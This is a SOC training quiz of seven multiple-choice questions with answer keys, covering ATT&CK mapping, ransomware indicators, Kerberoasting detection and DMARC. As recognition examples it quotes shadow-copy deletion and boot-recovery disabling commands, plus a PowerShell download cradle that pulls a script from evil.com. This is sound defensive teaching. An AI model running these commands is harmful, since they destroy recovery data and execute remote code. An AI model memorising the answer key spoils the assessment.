# Final Quiz — Session 06: Incident Analysis in a Threat-Centric SOC

**Purpose:** Assess mastery of session learning objectives

**Questions:** 7 multiple choice

**Time:** 15 minutes

**Passing score:** 5/7

---

## Question 1

A SOC analyst discovers that `svchost.exe` running on a server is making outbound TCP connections to port 4444 on an external IP.
The process has a parent process of `powershell.exe`.
Which MITRE ATT&CK technique BEST describes the `svchost.exe` behavior?

A) T1055 — Process Injection
B) T1036.005 — Masquerading: Match Legitimate Name
C) T1543.003 — Create or Modify System Process: Windows Service
D) T1071.001 — Application Layer Protocol: Web Protocols

**Correct answer:** B

**Explanation:** `svchost.exe` spawned by `powershell.exe` is not a legitimate Windows service host (those are spawned by `services.exe`).
This is a masquerading attack — naming a malicious process `svchost.exe` to blend in with legitimate processes (T1036.005).
The parent process being PowerShell is the giveaway.

---

## Question 2

During an incident, you discover that the attacker used `vssadmin.exe delete shadows /all /quiet` followed by `bcdedit /set {default} bootstatuspolicy ignoreallfailures`.
What type of incident is MOST likely in progress?

A) Data exfiltration via encrypted channel
B) Ransomware pre-deployment (anti-recovery stage)
C) Lateral movement using Pass-the-Hash
D) Web application SQL injection

**Correct answer:** B

**Explanation:** Both commands are classic ransomware preparation steps. `vssadmin delete shadows /all` removes Volume Shadow Copies (preventing file recovery). `bcdedit /set ... bootstatuspolicy ignoreallfailures` disables Windows error recovery on boot (preventing boot-time repair).
These are T1490 (Inhibit System Recovery) indicators — the attacker is disabling recovery options before deploying ransomware.

---

## Question 3

An analyst identifies a suspicious IP address in firewall logs.
Using the Pyramid of Pain framework, what is the LEAST valuable type of indicator for detection purposes?

A) Adversary TTPs
B) Network/host artifacts
C) Hash values of malware files
D) Domain names used for C2

**Correct answer:** C

**Explanation:** The Pyramid of Pain (David Bianco) shows that file hashes are at the bottom of the pyramid — the easiest for attackers to change (recompile the malware, change one byte = new hash).
TTPs are at the top — hardest for attackers to change and most valuable for detection.
Detecting based on behavior (how the attacker operates) survives tool changes.

---

## Question 4

A threat intelligence report states that an attacker group uses T1558.003 (Kerberoasting) as part of their privilege escalation.
Which Windows Security Event ID would best detect this technique?

A) Event ID 4624 (Logon) with Logon_Type 3
B) Event ID 4769 (Kerberos Service Ticket Request) with RC4 encryption type (0x17)
C) Event ID 4688 (Process Creation) for net.exe
D) Event ID 4672 (Special Privileges Assigned)

**Correct answer:** B

**Explanation:** Kerberoasting requests TGS (Service) Tickets with RC4 (0x17) encryption — because RC4-encrypted tickets are crackable offline with tools like Hashcat/John the Ripper.
Modern Kerberos defaults to AES (0x12, 0x11).
When Event 4769 shows RC4 being requested for a service account, it's a strong indicator of Kerberoasting (T1558.003).

---

## Question 5

During a phishing investigation, you decode a Base64 PowerShell command and find:
`IEX (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')`

This is a download cradle.
Which two ATT&CK techniques does this BEST represent?

A) T1059.001 (PowerShell) + T1105 (Ingress Tool Transfer)
B) T1059.001 (PowerShell) + T1566.001 (Spearphishing Attachment)
C) T1105 (Ingress Tool Transfer) + T1071.001 (Web Protocols)
D) T1027 (Obfuscation) + T1204.002 (User Execution)

**Correct answer:** A

**Explanation:** `IEX` (Invoke-Expression) executing code from a remote URL is a PowerShell download cradle.
T1059.001 = PowerShell execution.
T1105 = downloading a tool/payload from external infrastructure (Ingress Tool Transfer).
The Base64 encoding adds T1027, but the *primary* techniques describing this behavior are PowerShell execution and downloading a remote file.

---

## Question 6

An organization's DMARC policy is set to `p=none`.
A threat actor sends a phishing email spoofing the CEO's domain.
Which of the following BEST describes the security impact of `p=none`?

A) The email will be rejected at the mail gateway
B) The email will be quarantined to spam/junk folder
C) The email will be delivered with a DMARC PASS result
D) The email will be delivered despite authentication failure — `p=none` only monitors, it does not enforce

**Correct answer:** D

**Explanation:** DMARC `p=none` = monitoring mode.
The domain owner receives aggregate reports about authentication failures but emails are NOT quarantined or rejected. `p=quarantine` moves emails to spam. `p=reject` blocks delivery.
Many organizations run `p=none` for months/years while "monitoring" — this creates a significant phishing vulnerability as spoofed emails pass straight through.

---

## Question 7

In a post-incident review, you discover the attacker had domain admin credentials for 21 days before deployment of ransomware.
You were unaware because all the attacker's activity used living-off-the-land techniques and valid credentials.
What is the PRIMARY lesson learned from this dwell time?

A) The firewall should have blocked the initial phishing email
B) Detection based only on IOCs (file hashes, IPs) is insufficient — behavioral/TTP-based detection is required
C) The organization should have enforced MFA on email
D) The incident response plan should have faster recovery procedures

**Correct answer:** B

**Explanation:** The attacker used living-off-the-land (LOLBins) and valid credentials — there were no malicious file hashes to detect and no unauthorized accounts to flag.
Standard IOC-based detection would miss this entirely.
The lesson is that detection must be based on *behavioral patterns* (TTPs): privilege escalation events, unusual AD enumeration, DCSync from workstations, lateral movement with high-volume account switching.
This is the core argument for threat-centric, TTP-based detection over compliance-centric, IOC-based detection.

---

*End of Final Quiz*
